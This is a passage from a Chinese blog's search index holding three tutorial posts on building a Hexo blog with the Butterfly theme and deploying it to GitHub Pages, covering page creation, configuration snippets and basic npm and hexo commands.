友情链接页面</h2><p>创建友情链接页面：</p><pre><code>hexo new page link</code></pre><p>打开source&#x2F;link&#x2F;index.md文件：</p><pre><code>---title: 友情链接date: 2023-08-20 22:17:49type: &quot;link&quot;comments: false---</code></pre><p>添加友情链接：</p><p>在Hexo博客目录中的 source&#x2F;_data（如果没有 _data 文件夾，请自行创建），创建一个文件 link.yml</p><pre><code>- class_name: 友情链接  class_desc: 执子之手，与子偕老。  link_list:    - name: Hexo      link: https://hexo.io/zh-tw/      avatar: https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg      descr: 快速、簡單且強大的網誌框架- class_name: 网站  class_desc: 值得推荐的网站  link_list:    - name: Youtube      link: https://www.youtube.com/      avatar: https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png      descr: 視頻網站    - name: Weibo      link: https://www.weibo.com/      avatar: https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png      descr: 中國最大社交分享平台    - name: Twitter      link: https://twitter.com/      avatar: https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png      descr: 社交分享平台</code></pre><h2 id="9-留言板-评论"><a href="#9-留言板-评论" class="headerlink" title="9. 留言板&amp;评论"></a>9. 留言板&amp;评论</h2><p>创建留言板界面：</p><pre><code>hexo new page messageboard</code></pre><p>打开.&#x2F;source&#x2F;messageboard&#x2F;index.md：</p><pre><code>---title: 留言板date: 2023-08-20 20:21:06types: &quot;messageboard&quot;---</code></pre><h2 id="10-关于笔者"><a href="#10-关于笔者" class="headerlink" title="10. 关于笔者"></a>10. 关于笔者</h2><p>创建关于笔者界面：</p><pre><code>hexo new page about</code></pre><p>打开.&#x2F;source&#x2F;about&#x2F;index.md：</p><pre><code>---title: 关于我date: 2023-08-21 03:20:56type: &quot;about&quot;comments: false---</code></pre><h2 id="11-博文"><a href="#11-博文" class="headerlink" title="11. 博文"></a>11. 博文</h2><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><h3 id="文章分享"><a href="#文章分享" class="headerlink" title="文章分享"></a>文章分享</h3><p><strong>_config.butterfly.yml配置：</strong></p><pre><code># Share.js# https://github.com/overtrue/share.jssharejs:enable: truesites: wechat,qq,weibo</code></pre><hr><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/image-7.png" alt="Alt text"></p><h2 id="13-音乐播放器"><a href="#13-音乐播放器" class="headerlink" title="13. 音乐播放器"></a>13. 音乐播放器</h2><pre><code>Inject:bottom:- &#39;&lt;div class=&quot;aplayer no-destroy&quot; data-id=&quot;8674547170&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-fixed=&quot;true&quot; data-autoplay=&quot;true&quot; data-lrcType=&quot;-1&quot;&gt; &lt;/div&gt;&#39;# - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</code></pre><h2 id="14-背景美化"><a href="#14-背景美化" class="headerlink" title="14. 背景美化"></a>14. 背景美化</h2><pre><code># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)fireworks:  enable: true  zIndex: 9999 # -1 or 9999  mobile: false# Typewriter Effect (打字效果)# https://github.com/disjukr/activate-power-modeactivate_power_mode:  enable: true  colorful: true # open particle animation (冒光特效)  shake: false #  open shake (抖動特效)  mobile: true# canvas_nest# https://github.com/hustcc/canvas-nest.jscanvas_nest:  enable: true  color: &#39;0,0,255&#39; #color of lines, default: &#39;0,0,0&#39;; RGB values: (R,G,B).(note: use &#39;,&#39; to separate.)  opacity: 0.7 # the opacity of line (0~1), default: 0.5.  zIndex: -1 # z-index property of the background, default: -1.  count: 99 # the number of lines, default: 99.  mobile: false</code></pre>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> nodejs </tag>
            
            <tag> npm </tag>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客（一）：从零开始搭建你的个人博客</title>
      <link href="/posts/blog_hexo/"/>
      <url>/posts/blog_hexo/</url>
      
        <content type="html"><![CDATA[<p><em>此文章将会指引你搭建hexo框架的博客，并将其部署到Git Hub上。</em></p><h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h1><h2 id="1-安装Nodejs（npm）"><a href="#1-安装Nodejs（npm）" class="headerlink" title="1. 安装Nodejs（npm）"></a>1. 安装Nodejs（npm）</h2><p>下载链接：<a href="https://nodejs.org/en">Nodejs官方网站</a></p><p>这里直接选择官方推荐的稳定版本：Recommend For Most Users。</p><p><img src="/img/blog_hexo/image.png" alt="Alt text"></p><p>安装过程一路回车就好，默认选项不需要任何额外的操作。</p><p>安装完成以后，打开cmd。输入命令：<em><strong>node -v</strong></em>，若返回nodejs版本信息则安装成功。</p><p>nodejs内置npm。输入命令<em><strong>npm -v</strong></em>，返回npm版本信息则安装成功。</p><p><img src="/img/blog_hexo/image-1.png" alt="Alt text"></p><h2 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2. 安装Git"></a>2. 安装Git</h2><p><a href="https://git-scm.com/download/win">Git下载网址</a></p><p>下载标注的版本。</p><p><img src="/img/blog_hexo/image-2.png" alt="Alt text"></p><p>安装一路回车就好。</p><h1 id="二-本地部署你的博客"><a href="#二-本地部署你的博客" class="headerlink" title="二. 本地部署你的博客"></a>二. 本地部署你的博客</h1><h2 id="1-安装Hexo，新建hexo框架项目"><a href="#1-安装Hexo，新建hexo框架项目" class="headerlink" title="1. 安装Hexo，新建hexo框架项目"></a>1. 安装Hexo，新建hexo框架项目</h2><p>打开cmd输入命令：<em><strong>npm install -g hexo-cli</strong></em>，等待安装完成即可。</p><p>安装完成以后输入命令：<em><strong>hexo -v</strong></em>查看版本，返回结果则安装成功。</p><p>选择一个用于放置博客文件的文件夹，在此目录下使用命令：<em><strong>hexo init myblog</strong></em>，新建你的博客项目。你可以看到在你的文件夹下多了一个myblog的项目。</p><p>输入命令：<em><strong>cd myblog</strong></em>进入myblog项目，安装npm：<em><strong>npm install</strong></em>即可。</p><h2 id="2-在本地启动你的项目"><a href="#2-在本地启动你的项目" class="headerlink" title="2. 在本地启动你的项目"></a>2. 在本地启动你的项目</h2><p>在你的项目根目录下输入命令：<em><strong>hexo g</strong></em>生成博客网站的文件。</p><p>然后输入命令：<em><strong>hexo server</strong></em>启动你的博客。</p><p>接下来，你可以输入网址：<a href="http://localhost/4000">http://localhost/4000</a> 以访问你的个人博客。</p><p>像这样：</p><p><img src="/img/blog_hexo/image-5.png" alt="Alt text"></p><p>当然，如果你想停止你的博客服务，输入命令：<em><strong>Ctrl C</strong></em>即可。</p><h1 id="四-GiHub搭建博客"><a href="#四-GiHub搭建博客" class="headerlink" title="四. GiHub搭建博客"></a>四. GiHub搭建博客</h1><p>如果你没有GitHub账号，请前往官网注册：<a href="https://github.com/">GitHub官网</a> </p><h2 id="1-新建Pages类型仓库"><a href="#1-新建Pages类型仓库" class="headerlink" title="1. 新建Pages类型仓库"></a>1. 新建Pages类型仓库</h2><p><img src="/img/blog_hexo/image-3.png" alt="Alt text"></p><p><strong>你的仓库名（Repository name）必须是：xxx.github.io（xxx是你GitHub的用户名）</strong></p><p>下面的选项选择Public。</p><p><img src="/img/blog_hexo/image-4.png" alt="Alt text"></p><h2 id="2-安装hexo上传插件"><a href="#2-安装hexo上传插件" class="headerlink" title="2. 安装hexo上传插件"></a>2. 安装hexo上传插件</h2><p>输入命令：<em><strong>npm install hexo-deployer-git –save</strong></em></p><p>这个插件使用git上传hexo生成的网页文件。</p><h2 id="3-修改hexo配置文件指定仓库路径"><a href="#3-修改hexo配置文件指定仓库路径" class="headerlink" title="3. 修改hexo配置文件指定仓库路径"></a>3. 修改hexo配置文件指定仓库路径</h2><p>你可以在目录blog\hexo下找到 <strong>_config.yml</strong> 文件，修改以下配置。</p><p>如果你需要在文档快速定位以下内容，使用 <strong>Ctrl+F</strong> 查找 <strong>Deployment</strong> ，你可以定位文档中所有出现Deployment的地方。</p><pre><code># Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:type: &#39;git&#39;repo: https://github.com/Yangcheneee/Yangcheneee.github.io.gitbranch: main</code></pre><p><em>这里将 <strong>yangcheneee</strong> 修改为你的GitHub用户名即可</em></p><h2 id="4-部署博客到对应仓库"><a href="#4-部署博客到对应仓库" class="headerlink" title="4. 部署博客到对应仓库"></a>4. 部署博客到对应仓库</h2><p>输入命令：<em><strong>hexo clean</strong></em>清除之前生成的博客文件</p><p>输入命令：<em><strong>hexo generate</strong></em>（<em><strong>hexo g</strong></em>）生成博客的静态网页文件</p><p>输入命令：<em><strong>hexo deploy</strong></em>（<em><strong>hexo d</strong></em>）将生成的博客文件推送到github仓库</p><p>将博客文件上传到GitHub仓库时，需要进行身份验证，在这个过程中保持登录GitHub，根据提示完成验证即可。</p><p>接下来访问网站：<a href="http://xxx.github.io/">http://xxx.github.io</a> （xxx为你的用户名）即可。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> nodejs </tag>
            
            <tag> npm </tag>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
            <tag> hexo </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客：写在前面</title>
      <link href="/posts/blog_pre/"/>
      <url>/posts/blog_pre/</url>
      
        <content type="html"><![CDATA[<p><em>如果你有任何问题，在评论提出</em></p><h2 id="1-博客？"><a href="#1-博客？" class="headerlink" title="1. 博客？"></a>1. 博客？</h2><p>一些好看的博客：<a href="https://butterfly.js.org/link/#%E7%A4%BA%E4%BE%8B">这里</a></p><p>我的个人博客：<a href="https://yangcheneee.github.io/">良月的小窝</a></p><p><img src="/img/blog_pre/image.png" alt="Alt text"></p><p>你可以通过这个系列文章做出与我相似的个人博客，当然或许更好。</p><h2 id="2-个人博客有啥用？"><a href="#2-个人博客有啥用？" class="headerlink" title="2. 个人博客有啥用？"></a>2. 个人博客有啥用？</h2><ul><li><p>个人博客主要用于记录你的学习笔记，简单来说博客是一个在线记事本。</p></li><li><p>除此之外，个人博客可以用于知识分享，其他人可以通过网络访问你的博客。</p></li><li><p>抑或是用于满足好奇心，抑或是喜欢漂亮的博客页面……</p></li><li><p>总之，搭建你的个人博客并不需要太多理由，只是去做也是一种乐趣！</p></li></ul><h2 id="3-搭建个人博客难吗？"><a href="#3-搭建个人博客难吗？" class="headerlink" title="3. 搭建个人博客难吗？"></a>3. 搭建个人博客难吗？</h2><p>一点都不难！</p><p>你可以不写任何代码，只是安装一些文件并配置它们就可以搭建属于你的个人博客。</p><h2 id="4-如何搭建我的个人博客？"><a href="#4-如何搭建我的个人博客？" class="headerlink" title="4. 如何搭建我的个人博客？"></a>4. 如何搭建我的个人博客？</h2><p>我采用GitHub Pages搭建hexo框架的butterfly主题博客，这是一种简单的方式。</p><p>大概流程：下载框架和主题文件；修改配置以美化你的博客界面；生成网页静态文件上传到Git Hub仓库使得其他人可以访问。</p><p>如果你感兴趣，我很乐意继续讲下去。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
